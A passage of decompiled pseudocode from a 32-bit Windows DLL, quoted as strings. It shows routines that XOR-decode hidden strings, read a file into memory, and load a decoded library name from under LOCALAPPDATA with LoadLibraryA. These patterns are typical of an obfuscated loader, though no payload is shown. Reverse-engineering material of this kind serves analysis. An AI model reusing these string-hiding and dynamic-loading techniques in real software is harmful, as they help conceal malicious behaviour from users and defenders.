    "      if ( v8 < v9 )",
    "        sub_10003520();",
    "      v11 = v8 - v9;",
    "      v12 = 16;",
    "      if ( v11 < 0x10 )",
    "        v12 = v11;",
    "      v13 = &a2;",
    "      if ( a7 > 0xF )",
    "        v13 = (_DWORD **)a2;",
    "      sub_100018C0(&v36, (char *)v13 + v9, v12);",
    "      v33 = v10 | 2;",
    "      LOBYTE(v39) = 2;",
    "      v14 = (char *)&v36;",
    "      v15 = -1;",
    "      Block = (_BYTE *)v36;",
    "      if ( v37 != -1 )",
    "        v15 = v37;",
    "      if ( v38 > 0xF )",
    "        v14 = (char *)v36;",
    "      v31 = v14;",
    "      if ( v15 <= 0x10 )",
    "      {",
    "        v18 = 0;",
    "        if ( !v15 )",
    "          goto LABEL_27;",
    "      }",
    "      else",
    "      {",
    "        for ( i = 16; i < v15; ++i )",
    "        {",
    "          v17 = v14[i];",
    "          if ( v17 != 49 && v17 != 48 )",
    "LABEL_44:",
    "            sub_10011AB0();",
    "        }",
    "        v15 = 16;",
    "        v18 = 0;",
    "      }",
    "      v19 = 0;",
    "      v20 = &v14[v15];",
    "      v21 = 0;",
    "      do",
    "      {",
    "        v22 = *--v20;",
    "        v35 = v22;",
    "        v21 |= (v22 == 49) << v19;",
    "        if ( v22 != 49 && v35 != 48 )",
    "          goto LABEL_44;",
    "        if ( ++v19 == 32 )",
    "        {",
    "          *(_DWORD *)&v34[4 * v18++] = v21;",
    "          v21 = 0;",
    "          v19 = 0;",
    "        }",
    "      }",
    "      while ( v31 != v20 );",
    "      if ( v19 )",
    "        *(_DWORD *)&v34[4 * v18++] = v21;",
    "      if ( !v18 )",
    "LABEL_27:",
    "        memset(&v34[4 * v18], 0, 4 * ((unsigned int)(4 - 4 * v18) >> 2));",
    "      v7 = a1;",
    "      v23 = a1[4];",
    "      v24 = a1[5];",
    "      if ( v23 >= v24 )",
    "      {",
    "        LOBYTE(v30) = 0;",
    "        sub_100019A0((void **)a1, v23, v30, v34[0]);",
    "      }",
    "      else",
    "      {",
    "        v25 = a1;",
    "        a1[4] = v23 + 1;",
    "        if ( v24 > 0xF )",
    "          v25 = (_DWORD *)*a1;",
    "        *((_BYTE *)v25 + v23) = v34[0];",
    "        *((_BYTE *)v25 + v23 + 1) = 0;",
    "      }",
    "      LOBYTE(v39) = 1;",
    "      if ( v38 > 0xF )",
    "      {",
    "        v26 = Block;",
    "        if ( v38 + 1 >= 0x1000 )",
    "        {",
    "          v26 = (_BYTE *)*((_DWORD *)Block - 1);",
    "          if ( (unsigned int)(Block - v26 - 4) > 0x1F )",
    "            goto LABEL_46;",
    "        }",
    "        sub_100154EB(v26);",
    "      }",
    "      v8 = a6;",
    "      v9 = v32 + 16;",
    "      v32 = v9;",
    "      if ( v9 >= a6 )",
    "        break;",
    "      v10 = v33;",
    "    }",
    "  }",
    "  if ( a7 > 0xF )",
    "  {",
    "    v27 = a2;",
    "    if ( a7 + 1 >= 0x1000 )",
    "    {",
    "      v27 = (_BYTE *)*(a2 - 1);",
    "      if ( (unsigned int)((char *)a2 - v27 - 4) > 0x1F )",
    "LABEL_46:",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_100154EB(v27);",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "FILE *__stdcall sub_1000B270(FILE *a1, char *FileName, int a3, int a4, int a5, int a6, unsigned int a7)",
    "{",
    "  FILE *v7; // edi",
    "  _DWORD *v8; // esi",
    "  const char *p_FileName; // ecx",
    "  const char *v10; // eax",
    "  FILE *v11; // eax",
    "  FILE *v12; // esi",
    "  int v13; // edx",
    "  int v14; // ecx",
    "  size_t v15; // eax",
    "  _DWORD *v16; // esi",
    "  size_t v17; // edi",
    "  void *v18; // eax",
    "  size_t v19; // eax",
    "  void **v20; // eax",
    "  void *v21; // edx",
    "  size_t v22; // ecx",
    "  size_t v23; // edi",
    "  char *v24; // eax",
    "  unsigned int v25; // ecx",
    "  char *v26; // edx",
    "  size_t v27; // ecx",
    "  void *v28; // edx",
    "  size_t v29; // ecx",
    "  void *v30; // edx",
    "  size_t v31; // ecx",
    "  void *v32; // edx",
    "  size_t v33; // ecx",
    "  char *v34; // edx",
    "  size_t v35; // ecx",
    "  _DWORD *v36; // ecx",
    "  size_t v37; // edi",
    "  char *v38; // eax",
    "  char *v39; // edx",
    "  size_t v40; // ecx",
    "  void *v41; // edx",
    "  size_t v42; // ecx",
    "  void *v43; // edx",
    "  size_t v44; // ecx",
    "  void *v45; // edx",
    "  size_t v46; // ecx",
    "  char *v47; // edx",
    "  size_t v48; // ecx",
    "  char *v50; // edx",
    "  size_t v51; // ecx",
    "  void *v52; // edx",
    "  size_t v53; // ecx",
    "  void *v54; // edx",
    "  size_t v55; // ecx",
    "  void *v56; // edx",
    "  size_t v57; // ecx",
    "  void *v58[6]; // [esp-30h] [ebp-F8h] BYREF",
    "  _DWORD *v59; // [esp-18h] [ebp-E0h] BYREF",
    "  int v60; // [esp-14h] [ebp-DCh]",
    "  int v61; // [esp-10h] [ebp-D8h]",
    "  int v62; // [esp-Ch] [ebp-D4h]",
    "  void *v63; // [esp-8h] [ebp-D0h]",
    "  size_t v64; // [esp-4h] [ebp-CCh]",
    "  int v65; // [esp+0h] [ebp-C8h]",
    "  void *v66; // [esp+10h] [ebp-B8h]",
    "  FILE *Stream; // [esp+14h] [ebp-B4h]",
    "  size_t Size; // [esp+18h] [ebp-B0h]",
    "  __int128 v69; // [esp+1Ch] [ebp-ACh] BYREF",
    "  __int64 v70; // [esp+2Ch] [ebp-9Ch]",
    "  void *v71[5]; // [esp+34h] [ebp-94h] BYREF",
    "  unsigned int v72; // [esp+48h] [ebp-80h]",
    "  void *v73[5]; // [esp+4Ch] [ebp-7Ch] BYREF",
    "  unsigned int v74; // [esp+60h] [ebp-68h]",
    "  void *Block[4]; // [esp+64h] [ebp-64h] BYREF",
    "  size_t v76; // [esp+74h] [ebp-54h]",
    "  unsigned int v77; // [esp+78h] [ebp-50h]",
    "  __int64 v78; // [esp+7Ch] [ebp-4Ch]",
    "  size_t v79; // [esp+84h] [ebp-44h]",
    "  void *v80[4]; // [esp+88h] [ebp-40h] BYREF",
    "  int v81; // [esp+98h] [ebp-30h]",
    "  unsigned int v82; // [esp+9Ch] [ebp-2Ch]",
    "  char *Mode[4]; // [esp+A0h] [ebp-28h] BYREF",
    "  int v84; // [esp+B0h] [ebp-18h]",
    "  unsigned int v85; // [esp+B4h] [ebp-14h]",
    "  int v86; // [esp+C4h] [ebp-4h]",
    "",
    "  v7 = a1;",
    "  v66 = a1;",
    "  Stream = a1;",
    "  v86 = 1;",
    "  v69 = 0;",
    "  v70 = 0xF00000000LL;",
    "  LOBYTE(v69) = 0;",
    "  v8 = (_DWORD *)sub_10002FE0();",
    "  sub_10009E70(v71, v8 + 180);",
    "  LOBYTE(v86) = 2;",
    "  sub_10009E70(v73, v8);",
    "  LOBYTE(v86) = 3;",
    "  sub_10009E70(&v59, v73);",
    "  sub_1000B000(v80, v59, v60, v61, v62, (unsigned int)v63, v64);",
    "  LOBYTE(v86) = 4;",
    "  Stream = (FILE *)&v59;",
    "  sub_10009E70(&v59, v80);",
    "  LOBYTE(v86) = 5;",
    "  sub_10009E70(v58, v71);",
    "  LOBYTE(v86) = 4;",
    "  sub_1000B970(",
    "    (int)Mode,",
    "    v58[0],",
    "    (int)v58[1],",
    "    (int)v58[2],",
    "    (int)v58[3],",
    "    (int)v58[4],",
    "    (int)v58[5],",
    "    v59,",
    "    v60,",
    "    v61,",
    "    v62,",
    "    (int)v63,",
    "    v64);",
    "  LOBYTE(v86) = 6;",
    "  p_FileName = (const char *)&FileName;",
    "  v10 = (const char *)Mode;",
    "  if ( a7 > 0xF )",
    "    p_FileName = FileName;",
    "  if ( v85 > 0xF )",
    "    v10 = Mode[0];",
    "  v11 = fopen(p_FileName, v10);",
    "  v12 = v11;",
    "  Stream = v11;",
    "  if ( !v11 )",
    "  {",
    "    v64 = 0;",
    "    *(_OWORD *)&a1->_ptr = 0;",
    "    v63 = &unk_1003B3A1;",
    "    a1->_file = 0;",
    "    a1->_charbuf = 0;",
    "    sub_100018C0(a1, v63, v64);",
    "    if ( v85 > 0xF )",
    "    {",
    "      v50 = Mode[0];",
    "      v51 = v85 + 1;",
    "      if ( v85 + 1 >= 0x1000 )",
    "      {",
    "        v50 = (char *)*((_DWORD *)Mode[0] - 1);",
    "        v51 = v85 + 36;",
    "        if ( (unsigned int)(Mode[0] - v50 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v51;",
    "      sub_100154EB(v50);",
    "    }",
    "    v84 = 0;",
    "    v85 = 15;",
    "    LOBYTE(Mode[0]) = 0;",
    "    if ( v82 > 0xF )",
    "    {",
    "      v52 = v80[0];",
    "      v53 = v82 + 1;",
    "      if ( v82 + 1 >= 0x1000 )",
    "      {",
    "        v52 = (void *)*((_DWORD *)v80[0] - 1);",
    "        v53 = v82 + 36;",
    "        if ( (unsigned int)((char *)v80[0] - (char *)v52 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v53;",
    "      sub_100154EB(v52);",
    "    }",
    "    v81 = 0;",
    "    v82 = 15;",
    "    LOBYTE(v80[0]) = 0;",
    "    if ( v74 > 0xF )",
    "    {",
    "      v54 = v73[0];",
    "      v55 = v74 + 1;",
    "      if ( v74 + 1 >= 0x1000 )",
    "      {",
    "        v54 = (void *)*((_DWORD *)v73[0] - 1);",
    "        v55 = v74 + 36;",
    "        if ( (unsigned int)((char *)v73[0] - (char *)v54 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v55;",
    "      sub_100154EB(v54);",
    "    }",
    "    if ( v72 > 0xF )",
    "    {",
    "      v56 = v71[0];",
    "      v57 = v72 + 1;",
    "      if ( v72 + 1 >= 0x1000 )",
    "      {",
    "        v56 = (void *)*((_DWORD *)v71[0] - 1);",
    "        v57 = v72 + 36;",
    "        if ( (unsigned int)((char *)v71[0] - (char *)v56 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v57;",
    "      sub_100154EB(v56);",
    "    }",
    "    if ( a7 <= 0xF )",
    "      return v7;",
    "    v34 = FileName;",
    "    v35 = a7 + 1;",
    "    if ( a7 + 1 < 0x1000 )",
    "      goto LABEL_44;",
    "    v34 = (char *)*((_DWORD *)FileName - 1);",
    "    v35 = a7 + 36;",
    "    if ( (unsigned int)(FileName - v34 - 4) <= 0x1F )",
    "      goto LABEL_44;",
    "LABEL_90:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  fseek(v11, 0, 2);",
    "  Size = ftell(v12);",
    "  fseek(v12, 0, 0);",
    "  v15 = Size;",
    "  v16 = 0;",
    "  v17 = 0;",
    "  v78 = 0;",
    "  v79 = 0;",
    "  if ( Size )",
    "  {",
    "    if ( Size > 0x7FFFFFFF )",
    "      sub_10003530(v14, v13);",
    "    if ( Size < 0x1000 )",
    "    {",
    "      v16 = operator new(Size);",
    "    }",
    "    else",
    "    {",
    "      if ( Size + 35 < Size )",
    "        sub_100014A0(v65);",
    "      v18 = operator new(Size + 35);",
    "      if ( !v18 )",
    "        goto LABEL_90;",
    "      v16 = (_DWORD *)(((unsigned int)v18 + 35) & 0xFFFFFFE0);",
    "      *(v16 - 1) = v18;",
    "    }",
    "    v17 = (size_t)v16 + Size;",
    "    LODWORD(v78) = v16;",
    "    v79 = (size_t)v16 + Size;",
    "    memset(v16, 0, Size);",
    "    v15 = Size;",
    "    HIDWORD(v78) = v17;",
    "  }",
    "  LOBYTE(v86) = 7;",
    "  v19 = fread(v16, 1u, v15, Stream);",
    "  if ( v19 != Size )",
    "  {",
    "    v36 = v66;",
    "    v64 = 0;",
    "    v63 = &unk_1003B3A1;",
    "    *(_OWORD *)v66 = 0;",
    "    v36[4] = 0;",
    "    v36[5] = 0;",
    "    sub_100018C0(v36, v63, v64);",
    "    if ( v16 )",
    "    {",
    "      v37 = v17 - (_DWORD)v16;",
    "      v38 = (char *)v16;",
    "      if ( v37 >= 0x1000 )",
    "      {",
    "        v16 = (_DWORD *)*(v16 - 1);",
    "        v37 += 35;",
    "        if ( (unsigned int)(v38 - (char *)v16 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v37;",
    "      sub_100154EB(v16);",
    "    }",
    "    if ( v85 > 0xF )",
    "    {",
    "      v39 = Mode[0];",
    "      v40 = v85 + 1;",
    "      if ( v85 + 1 >= 0x1000 )",
    "      {",
    "        v39 = (char *)*((_DWORD *)Mode[0] - 1);",
    "        v40 = v85 + 36;",
    "        if ( (unsigned int)(Mode[0] - v39 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v40;",
    "      sub_100154EB(v39);",
    "    }",
    "    v84 = 0;",
    "    v85 = 15;",
    "    LOBYTE(Mode[0]) = 0;",
    "    if ( v82 > 0xF )",
    "    {",
    "      v41 = v80[0];",
    "      v42 = v82 + 1;",
    "      if ( v82 + 1 >= 0x1000 )",
    "      {",
    "        v41 = (void *)*((_DWORD *)v80[0] - 1);",
    "        v42 = v82 + 36;",
    "        if ( (unsigned int)((char *)v80[0] - (char *)v41 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v42;",
    "      sub_100154EB(v41);",
    "    }",
    "    v81 = 0;",
    "    v82 = 15;",
    "    LOBYTE(v80[0]) = 0;",
    "    if ( v74 > 0xF )",
    "    {",
    "      v43 = v73[0];",
    "      v44 = v74 + 1;",
    "      if ( v74 + 1 >= 0x1000 )",
    "      {",
    "        v43 = (void *)*((_DWORD *)v73[0] - 1);",
    "        v44 = v74 + 36;",
    "        if ( (unsigned int)((char *)v73[0] - (char *)v43 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v44;",
    "      sub_100154EB(v43);",
    "    }",
    "    if ( v72 > 0xF )",
    "    {",
    "      v45 = v71[0];",
    "      v46 = v72 + 1;",
    "      if ( v72 + 1 >= 0x1000 )",
    "      {",
    "        v45 = (void *)*((_DWORD *)v71[0] - 1);",
    "        v46 = v72 + 36;",
    "        if ( (unsigned int)((char *)v71[0] - (char *)v45 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v46;",
    "      sub_100154EB(v45);",
    "    }",
    "    if ( a7 > 0xF )",
    "    {",
    "      v47 = FileName;",
    "      v48 = a7 + 1;",
    "      if ( a7 + 1 >= 0x1000 )",
    "      {",
    "        v47 = (char *)*((_DWORD *)FileName - 1);",
    "        v48 = a7 + 36;",
    "        if ( (unsigned int)(FileName - v47 - 4) > 0x1F )",
    "          goto LABEL_90;",
    "      }",
    "      v64 = v48;",
    "      sub_100154EB(v47);",
    "    }",
    "    return (FILE *)v66;",
    "  }",
    "  v76 = 0;",
    "  *(_OWORD *)Block = 0;",
    "  v77 = 0;",
    "  sub_100018C0(Block, v16, Size);",
    "  LOBYTE(v86) = 8;",
    "  v20 = Block;",
    "  v64 = v76;",
    "  if ( v77 > 0xF )",
    "    v20 = (void **)Block[0];",
    "  sub_100030B0((void **)&v69, v20, v64);",
    "  if ( v77 > 0xF )",
    "  {",
    "    v21 = Block[0];",
    "    v22 = v77 + 1;",
    "    if ( v77 + 1 >= 0x1000 )",
    "    {",
    "      v21 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v22 = v77 + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v21 - 4) > 0x1F )",
    "        goto LABEL_90;",
    "    }",
    "    v64 = v22;",
    "    sub_100154EB(v21);",
    "  }",
    "  fclose(Stream);",
    "  if ( v16 )",
    "  {",
    "    v23 = v17 - (_DWORD)v16;",
    "    v24 = (char *)v16;",
    "    if ( v23 >= 0x1000 )",
    "    {",
    "      v16 = (_DWORD *)*(v16 - 1);",
    "      v23 += 35;",
    "      if ( (unsigned int)(v24 - (char *)v16 - 4) > 0x1F )",
    "        goto LABEL_90;",
    "    }",
    "    v64 = v23;",
    "    sub_100154EB(v16);",
    "  }",
    "  v7 = (FILE *)v66;",
    "  v25 = v85;",
    "  *(_OWORD *)v66 = 0;",
    "  v7->_file = 0;",
    "  v7->_charbuf = 0;",
    "  *(_OWORD *)&v7->_ptr = v69;",
    "  *(_QWORD *)&v7->_file = v70;",
    "  if ( v25 > 0xF )",
    "  {",
    "    v26 = Mode[0];",
    "    v27 = v25 + 1;",
    "    if ( v27 >= 0x1000 )",
    "    {",
    "      v26 = (char *)*((_DWORD *)Mode[0] - 1);",
    "      v27 += 35;",
    "      if ( (unsigned int)(Mode[0] - v26 - 4) > 0x1F )",
    "        goto LABEL_90;",
    "    }",
    "    v64 = v27;",
    "    sub_100154EB(v26);",
    "  }",
    "  v84 = 0;",
    "  v85 = 15;",
    "  LOBYTE(Mode[0]) = 0;",
    "  if ( v82 > 0xF )",
    "  {",
    "    v28 = v80[0];",
    "    v29 = v82 + 1;",
    "    if ( v82 + 1 >= 0x1000 )",
    "    {",
    "      v28 = (void *)*((_DWORD *)v80[0] - 1);",
    "      v29 = v82 + 36;",
    "      if ( (unsigned int)((char *)v80[0] - (char *)v28 - 4) > 0x1F )",
    "        goto LABEL_90;",
    "    }",
    "    v64 = v29;",
    "    sub_100154EB(v28);",
    "  }",
    "  v81 = 0;",
    "  v82 = 15;",
    "  LOBYTE(v80[0]) = 0;",
    "  if ( v74 > 0xF )",
    "  {",
    "    v30 = v73[0];",
    "    v31 = v74 + 1;",
    "    if ( v74 + 1 >= 0x1000 )",
    "    {",
    "      v30 = (void *)*((_DWORD *)v73[0] - 1);",
    "      v31 = v74 + 36;",
    "      if ( (unsigned int)((char *)v73[0] - (char *)v30 - 4) > 0x1F )",
    "        goto LABEL_90;",
    "    }",
    "    v64 = v31;",
    "    sub_100154EB(v30);",
    "  }",
    "  if ( v72 > 0xF )",
    "  {",
    "    v32 = v71[0];",
    "    v33 = v72 + 1;",
    "    if ( v72 + 1 >= 0x1000 )",
    "    {",
    "      v32 = (void *)*((_DWORD *)v71[0] - 1);",
    "      v33 = v72 + 36;",
    "      if ( (unsigned int)((char *)v71[0] - (char *)v32 - 4) > 0x1F )",
    "        goto LABEL_90;",
    "    }",
    "    v64 = v33;",
    "    sub_100154EB(v32);",
    "  }",
    "  if ( a7 > 0xF )",
    "  {",
    "    v34 = FileName;",
    "    v35 = a7 + 1;",
    "    if ( a7 + 1 < 0x1000",
    "      || (v34 = (char *)*((_DWORD *)FileName - 1), v35 = a7 + 36, (unsigned int)(FileName - v34 - 4) <= 0x1F) )",
    "    {",
    "LABEL_44:",
    "      v64 = v35;",
    "      sub_100154EB(v34);",
    "      return v7;",
    "    }",
    "    goto LABEL_90;",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "_DWORD *__stdcall sub_1000B970(",
    "        _DWORD *a1,",
    "        _DWORD *Block,",
    "        int a3,",
    "        int a4,",
    "        int a5,",
    "        int a6,",
    "        unsigned int a7,",
    "        _DWORD *a8,",
    "        int a9,",
    "        int a10,",
    "        int a11,",
    "        int a12,",
    "        unsigned int a13)",
    "{",
    "  int v13; // ebx",
    "  int i; // ecx",
    "  _DWORD **p_Block; // eax",
    "  _DWORD **v16; // esi",
    "  _BYTE *v17; // esi",
    "  _DWORD *v18; // edx",
    "  _BYTE *v19; // edx",
    "  void *v20; // edx",
    "  int v22; // [esp+14h] [ebp-14h]",
    "",
    "  v13 = a6;",
    "  v22 = a12;",
    "  sub_10009E70(a1, &Block);",
    "  for ( i = 0; i < v13; ++i )",
    "  {",
    "    p_Block = &Block;",
    "    v16 = &a8;",
    "    if ( a7 > 0xF )",
    "      p_Block = (_DWORD **)Block;",
    "    if ( a13 > 0xF )",
    "      v16 = (_DWORD **)a8;",
    "    v17 = (char *)v16 + i % v22;",
    "    v18 = a1;",
    "    if ( a1[5] > 0xFu )",
    "      v18 = (_DWORD *)*a1;",
    "    *((_BYTE *)v18 + i) = *v17 ^ *((_BYTE *)p_Block + i);",
    "  }",
    "  if ( a7 > 0xF )",
    "  {",
    "    v19 = Block;",
    "    if ( a7 + 1 >= 0x1000 )",
    "    {",
    "      v19 = (_BYTE *)*(Block - 1);",
    "      if ( (unsigned int)((char *)Block - v19 - 4) > 0x1F )",
    "        goto LABEL_18;",
    "    }",
    "    sub_100154EB(v19);",
    "  }",
    "  a6 = 0;",
    "  a7 = 15;",
    "  LOBYTE(Block) = 0;",
    "  if ( a13 > 0xF )",
    "  {",
    "    v20 = a8;",
    "    if ( a13 + 1 < 0x1000 || (v20 = (void *)*(a8 - 1), (unsigned int)((char *)a8 - (_BYTE *)v20 - 4) <= 0x1F) )",
    "    {",
    "      sub_100154EB(v20);",
    "      return a1;",
    "    }",
    "LABEL_18:",
    "    _invalid_parameter_noinfo_noreturn();",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "void *__stdcall sub_1000BA90(void *a1, _DWORD *Src, int a3, int a4, int a5, size_t Size, unsigned int a7)",
    "{",
    "  void *v7; // edx",
    "  _DWORD *v8; // edi",
    "  void **v9; // ecx",
    "  void **v10; // eax",
    "  _DWORD **p_Src; // edx",
    "  int v12; // esi",
    "  void **v13; // eax",
    "  char *v14; // esi",
    "  void **v15; // eax",
    "  void *v16; // edx",
    "  unsigned int v17; // ecx",
    "  _DWORD *v18; // edi",
    "  const CHAR *v19; // eax",
    "  LPCSTR *v20; // ecx",
    "  const WCHAR *v21; // eax",
    "  HMODULE ModuleHandleW; // eax",
    "  const CHAR *v23; // eax",
    "  HMODULE LibraryA; // esi",
    "  _DWORD *v25; // ecx",
    "  void *v26; // edx",
    "  unsigned int v27; // ecx",
    "  WCHAR *v28; // edx",
    "  unsigned int v29; // ecx",
    "  CHAR *v30; // edx",
    "  unsigned int v31; // ecx",
    "  void *v32; // edx",
    "  unsigned int v33; // ecx",
    "  CHAR *v34; // edx",
    "  unsigned int v35; // ecx",
    "  void *v36; // edx",
    "  unsigned int v37; // ecx",
    "  void *v38; // edx",
    "  unsigned int v39; // ecx",
    "  void *v40; // edx",
    "  unsigned int v41; // ecx",
    "  void *v42; // esi",
    "  void **v44; // eax",
    "  void (__stdcall *v45)(void **, _DWORD); // ecx",
    "  void **v46; // eax",
    "  void *v47; // edx",
    "  unsigned int v48; // ecx",
    "  WCHAR *v49; // edx",
    "  unsigned int v50; // ecx",
    "  CHAR *v51; // edx",
    "  unsigned int v52; // ecx",
    "  void *v53; // edx",
    "  unsigned int v54; // ecx",
    "  CHAR *v55; // edx",
    "  unsigned int v56; // ecx",
    "  void *v57; // edx",
    "  unsigned int v58; // ecx",
    "  void *v59; // edx",
    "  unsigned int v60; // ecx",
    "  void *v61; // edx",
    "  unsigned int v62; // ecx",
    "  _DWORD *v63; // [esp-30h] [ebp-120h] BYREF",
    "  int v64; // [esp-2Ch] [ebp-11Ch]",
    "  int v65; // [esp-28h] [ebp-118h]",
    "  int v66; // [esp-24h] [ebp-114h]",
    "  const void *v67; // [esp-20h] [ebp-110h]",
    "  unsigned int v68; // [esp-1Ch] [ebp-10Ch]",
    "  __int128 v69; // [esp-18h] [ebp-108h] BYREF",
    "  __int64 v70; // [esp-8h] [ebp-F8h]",
    "  void *Block[4]; // [esp+10h] [ebp-E0h] BYREF",
    "  int v72; // [esp+20h] [ebp-D0h]",
    "  unsigned int v73; // [esp+24h] [ebp-CCh]",
    "  _DWORD *v74; // [esp+28h] [ebp-C8h]",
    "  void *v75; // [esp+2Ch] [ebp-C4h]",
    "  LPCCH lpMultiByteStr; // [esp+30h] [ebp-C0h]",
    "  int ProcAddress; // [esp+34h] [ebp-BCh]",
    "  void *v78[4]; // [esp+38h] [ebp-B8h] BYREF",
    "  size_t v79; // [esp+48h] [ebp-A8h]",
    "  unsigned int v80; // [esp+4Ch] [ebp-A4h]",
    "  void *v81[4]; // [esp+50h] [ebp-A0h] BYREF",
    "  size_t v82; // [esp+60h] [ebp-90h]",
    "  unsigned int v83; // [esp+64h] [ebp-8Ch]",
    "  LPCSTR lpProcName[4]; // [esp+68h] [ebp-88h] BYREF",
    "  int v85; // [esp+78h] [ebp-78h]",
    "  unsigned int v86; // [esp+7Ch] [ebp-74h]",
    "  LPCWSTR lpModuleName[4]; // [esp+80h] [ebp-70h] BYREF",
    "  int v88; // [esp+90h] [ebp-60h]",
    "  unsigned int v89; // [esp+94h] [ebp-5Ch]",
    "  void *v90[4]; // [esp+98h] [ebp-58h] BYREF",
    "  int v91; // [esp+A8h] [ebp-48h]",
    "  unsigned int v92; // [esp+ACh] [ebp-44h]",
    "  void *v93[4]; // [esp+B0h] [ebp-40h] BYREF",
    "  int v94; // [esp+C0h] [ebp-30h]",
    "  unsigned int v95; // [esp+C4h] [ebp-2Ch]",
    "  LPCSTR lpLibFileName[4]; // [esp+C8h] [ebp-28h] BYREF",
    "  int v97; // [esp+D8h] [ebp-18h]",
    "  unsigned int v98; // [esp+DCh] [ebp-14h]",
    "  int v99; // [esp+ECh] [ebp-4h]",
    "",
    "  v75 = a1;",
    "  ProcAddress = (int)a1;",
    "  v99 = 0;",
    "  v79 = 0;",
    "  v80 = 0;",
    "  *(_OWORD *)v78 = 0;",
    "  v7 = (void *)sub_1001DEE0(\"LOCALAPPDATA\");",
    "  sub_100018C0(v78, v7, strlen((const char *)v7));",
    "  LOBYTE(v99) = 1;",
    "  v8 = (_DWORD *)sub_10002FE0();",
    "  v82 = 0;",
    "  v74 = v8;",
    "  v83 = 0;",
    "  *(_OWORD *)v81 = 0;",
    "  sub_100018C0(v81, \"\\\\\", 1u);",
    "  LOBYTE(v99) = 2;",
    "  ProcAddress = (int)&v69;",
    "  sub_10009E70(&v63, v8);",
    "  sub_1000B000(&v69, v63, v64, v65, v66, (unsigned int)v67, v68);",
    "  LOBYTE(v99) = 3;",
    "  sub_10009E70(&v63, v8 + 186);",
    "  LOBYTE(v99) = 2;",
    "  sub_1000B970(",
    "    lpLibFileName,",
    "    v63,",
    "    v64,",
    "    v65,",
    "    v66,",
    "    (int)v67,",
    "    v68,",
    "    (_DWORD *)v69,",
    "    SDWORD1(v69),",
    "    SDWORD2(v69),",
    "    SHIDWORD(v69),",
    "    v70,",
    "    HIDWORD(v70));",
    "  LOBYTE(v99) = 4;",
    "  if ( 0x7FFFFFFF - v79 < v82 )",
    "    sub_10001540();",
    "  v9 = v78;",
    "  HIDWORD(v70) = v82;",
    "  if ( v80 > 0xF )",
    "    v9 = (void **)v78[0];",
    "  v10 = v81;",
    "  if ( v83 > 0xF )",
    "    v10 = (void **)v81[0];",
    "  sub_1000A6C0(Block, (int)lpMultiByteStr, (int)v9, v9, v79, v10, HIDWORD(v70));",
    "  LOBYTE(v99) = 5;",
    "  p_Src = &Src;",
    "  lpMultiByteStr = (LPCCH)&v69;",
    "  if ( a7 > 0xF )",
    "    p_Src = (_DWORD **)Src;",
    "  v12 = v72;",
    "  ProcAddress = Size;",
    "  v68 = Size;",
    "  v67 = p_Src;",
    "  if ( Size > v73 - v72 )",
    "  {",
    "    LOBYTE(ProcAddress) = 0;",
    "    v15 = sub_1000A260(Block, Size, ProcAddress, v67, v68);",
    "  }",
    "  else",
    "  {",
    "    v72 += Size;",
    "    v13 = Block;",
    "    if ( v73 > 0xF )",
    "      v13 = (void **)Block[0];",
    "    v14 = (char *)v13 + v12;",
    "    memmove(v14, v67, v68);",
    "    v14[ProcAddress] = 0;",
    "    v15 = Block;",
    "  }",
    "  v69 = 0;",
    "  v70 = 0;",
    "  v69 = *(_OWORD *)v15;",
    "  v70 = *((_QWORD *)v15 + 2);",
    "  v15[4] = 0;",
    "  v15[5] = (void *)15;",
    "  *(_BYTE *)v15 = 0;",
    "  sub_1000AA30((int)v93, (CHAR *)v69, SDWORD1(v69), SDWORD2(v69), SHIDWORD(v69), v70, HIDWORD(v70));",
    "  LOBYTE(v99) = 7;",
    "  if ( v73 > 0xF )",
    "  {",
    "    v16 = Block[0];",
    "    v17 = v73 + 1;",
    "    if ( v73 + 1 >= 0x1000 )",
    "    {",
    "      v16 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v17 = v73 + 36;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v16 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    HIDWORD(v70) = v17;",
    "    sub_100154EB(v16);",
    "  }",
    "  v18 = v74;",
    "  lpMultiByteStr = (LPCCH)&v69;",
    "  v72 = 0;",
    "  v73 = 15;",
    "  LOBYTE(Block[0]) = 0;",
    "  sub_10009E70(&v63, v74 + 6);",
    "  sub_1000B000(&v69, v63, v64, v65, v66, (unsigned int)v67, v68);",
    "  LOBYTE(v99) = 8;",
    "  sub_10009E70(&v63, v18 + 192);",
    "  LOBYTE(v99) = 7;",
    "  sub_1000B970(",
    "    lpProcName,",
    "    v63,",
    "    v64,",
    "    v65,",
    "    v66,",
    "    (int)v67,",
    "    v68,",
    "    (_DWORD *)v69,",
    "    SDWORD1(v69),",
    "    SDWORD2(v69),",
    "    SHIDWORD(v69),",
    "    v70,",
    "    HIDWORD(v70));",
    "  LOBYTE(v99) = 9;",
    "  sub_10009E70(&v69, lpLibFileName);",
    "  sub_1000AA30((int)lpModuleName, (CHAR *)v69, SDWORD1(v69), SDWORD2(v69), SHIDWORD(v69), v70, HIDWORD(v70));",
    "  LOBYTE(v99) = 10;",
    "  v19 = (const CHAR *)lpLibFileName;",
    "  if ( v98 > 0xF )",
    "    v19 = lpLibFileName[0];",
    "  LoadLibraryA(v19);",
    "  lpMultiByteStr = (LPCCH)&v69;",
    "  sub_10009E70(&v63, v74 + 24);",
    "  sub_1000B000(&v69, v63, v64, v65, v66, (unsigned int)v67, v68);",
    "  LOBYTE(v99) = 11;",
    "  sub_10009E70(&v63, v74 + 210);",
    "  LOBYTE(v99) = 10;",
